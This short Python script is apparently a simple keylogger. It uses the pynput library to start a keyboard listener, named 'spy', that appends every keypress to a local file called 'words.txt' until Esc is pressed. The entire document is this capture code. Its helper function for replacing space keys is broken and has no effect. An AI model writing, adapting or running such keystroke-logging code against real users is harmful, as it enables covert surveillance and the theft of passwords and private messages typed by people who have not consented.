import pynput.keyboard as spy
from pynput import keyboard
import sys

key_pressed = keyboard.Key

def keyboard_callback(key):
    txt = open("words.txt" , "a")
    if key == keyboard.Key.esc:
        sys.exit(0)
    
    print (key)
    txt.write(str(key).replace("'", ""))
    replaceKey(key, txt)

def replaceKey(key, txt):
    txt = open("words.txt" , "r")
    for line in txt:
        if "Key.space" in line:
            line.replace("Key.space", " ")

with spy.Listener(on_press=keyboard_callback) as my_spy:
    my_spy.join()



